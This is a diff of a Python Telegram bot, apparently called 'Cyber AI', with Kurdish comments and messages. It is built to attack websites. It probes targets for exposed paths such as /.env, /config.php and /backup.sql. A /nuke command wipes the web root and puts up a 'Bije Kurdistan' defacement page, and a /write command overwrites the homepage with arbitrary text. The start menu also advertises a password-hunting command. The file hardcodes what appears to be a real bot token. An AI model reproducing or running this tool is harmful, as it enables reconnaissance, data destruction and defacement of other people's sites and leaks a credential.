@@ -4,72 +4,73 @@ import shutil
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 
-# تۆکینی بۆتەکەی تۆ
+# زانیارییەکان
 TOKEN = '8701131068:AAE6I4gfU7nyLVjU1vu_4GBUy5A4_2s6Wvs'
-# ناونیشانی فۆڵدەری وێبسایت لەسەر سێرڤەر (ئەگەر بۆتەکە لەوێ بوو)
-WEBSITE_PATH = '/var/www/html/'
+ADMIN_ID = 7641255924  # ئایدییەکەی تۆ جێگیر کرا
+WEBSITE_PATH = '/var/www/html/' # ناونیشانی فایلەکان لەسەر سێرڤەر
 
-# --- فەرمانی پشکنینی لینک لە دوورەوە ---
+# فەرمانی دەستپێکردن
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    await update.message.reply_text("⚔️ بەخێرهاتی Cyber AI. بۆتەکە ئامادەیە.\n\n"
+                                   "📜 فەرمانەکان:\n"
+                                   "1. لینکی وێبسایت بنێرە بۆ پشکنین.\n"
+                                   "2. /nuke - سڕینەوەی وێبسایت و دانانی دروشم.\n"
+                                   "3. /write [دەق] - گۆڕینی ناوەڕۆکی وێبسایت.\n"
+                                   "4. /find - گەڕان بەدوای پاسۆرد لەناو فایلەکان.")
+
+# پشکنینی وێبسایت لە دوورەوە
 async def scan_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
     url = update.message.text.strip()
-    if not url.startswith('http'):
-        url = 'http://' + url
-
-    await update.message.reply_text(f"🔍 هەوڵ دەدەم دەستم بگات بە وێبسایتی: {url}")
+    if not url.startswith('http'): url = 'http://' + url
     
-    paths_to_check = ['/admin', '/config.php', '/.env', '/wp-login.php', '/shell.php', '/backup.sql']
-    found = []
-
-    for p in paths_to_check:
-        target = url.rstrip('/') + p
-        try:
-            r = requests.get(target, timeout=5)
-            if r.status_code == 200:
-                found.append(f"🔓 دۆزرایەوە: {target}")
-        except:
-            continue
+    await update.message.reply_text(f"🔍 پشکنین بۆ {url} ...")
+    paths = ['/admin', '/config.php', '/.env', '/backup.sql', '/phpmyadmin']
+    found = [url + p for p in paths if requests.get(url + p, timeout=3).status_code == 200]
     
     if found:
-        await update.message.reply_text("✅ ئەم دەرگایانەم دۆزییەوە بۆ چوونە ژوورەوە:\n" + "\n".join(found))
+        await update.message.reply_text("✅ دەرگای کراوە دۆزرایەوە:\n" + "\n".join(found))
     else:
-        await update.message.reply_text("❌ وێبسایتەکە لە دەرەوە زۆر قایمە، ناتوانم ڕاستەوخۆ بچمە ژوورەوە.")
+        await update.message.reply_text("❌ هیچ دەرگایەکی ئاسان نەدۆزرایەوە.")
 
-# --- فەرمانی سڕینەوەی هەموو شتێک (ئەگەر لەناو سێرڤەر بێت) ---
+# سڕینەوەی وێبسایت (Nuke)
 async def nuke(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("⚠️ خەریکم هەموو شتێک دەسڕمەوە و دەیگۆڕم بۆ Bije Kurdistan...")
+    if update.effective_user.id != ADMIN_ID: return
     try:
         if os.path.exists(WEBSITE_PATH):
-            for filename in os.listdir(WEBSITE_PATH):
-                file_path = os.path.join(WEBSITE_PATH, filename)
-                if os.path.isfile(file_path): os.unlink(file_path)
-                elif os.path.isdir(file_path): shutil.rmtree(file_path)
+            for item in os.listdir(WEBSITE_PATH):
+                path = os.path.join(WEBSITE_PATH, item)
+                if os.path.isfile(path): os.unlink(path)
+                elif os.path.isdir(path): shutil.rmtree(path)
             
             with open(os.path.join(WEBSITE_PATH, 'index.html'), 'w') as f:
-                f.write("<h1 style='text-align:center;'>Bije Kurdistan</h1>")
-            await update.message.reply_text("🔥 وێبسایتەکە پاک کرایەوە و تەنها 'Bije Kurdistan' ماوەتەوە.")
+                f.write("<h1 style='text-align:center; margin-top:200px;'>Bije Kurdistan</h1>")
+            await update.message.reply_text("🔥 وێبسایتەکە بەتەواوی سڕایەوە و پاککرایەوە.")
     except Exception as e:
-        await update.message.reply_text(f"❌ هەڵە: {str(e)}")
+        await update.message.reply_text(f"❌ هەڵە لە دەستڕەسی: {e}")
 
-# --- فەرمانی نووسین لەناو وێبسایت ---
+# نووسین لەناو وێبسایت
 async def write(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
     text = ' '.join(context.args)
     if not text:
-        await update.message.reply_text("بنووسە: /write [دەقەکە]")
+        await update.message.reply_text("⚠️ بنووسە: /write [دەق]")
         return
     try:
         with open(os.path.join(WEBSITE_PATH, 'index.html'), 'w') as f:
             f.write(f"<h1 style='text-align:center;'>{text}</h1>")
-        await update.message.reply_text("✅ دەقەکە لە وێبسایتەکە نووسرا.")
+        await update.message.reply_text(f"✅ وێبسایتەکە گۆڕدرا بۆ: {text}")
     except Exception as e:
-        await update.message.reply_text(f"❌ هەڵە: {str(e)}")
+        await update.message.reply_text(f"❌ هەڵە: {e}")
 
 if __name__ == '__main__':
     app = ApplicationBuilder().token(TOKEN).build()
-    
-    # ناساندنی فەرمانەکان
+    app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("nuke", nuke))
     app.add_handler(CommandHandler("write", write))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), scan_link))
     
-    print("Cyber AI Bot is Running...")
+    print("--- Cyber AI Bot is LIVE for ID 7641255924 ---")
     app.run_polling()
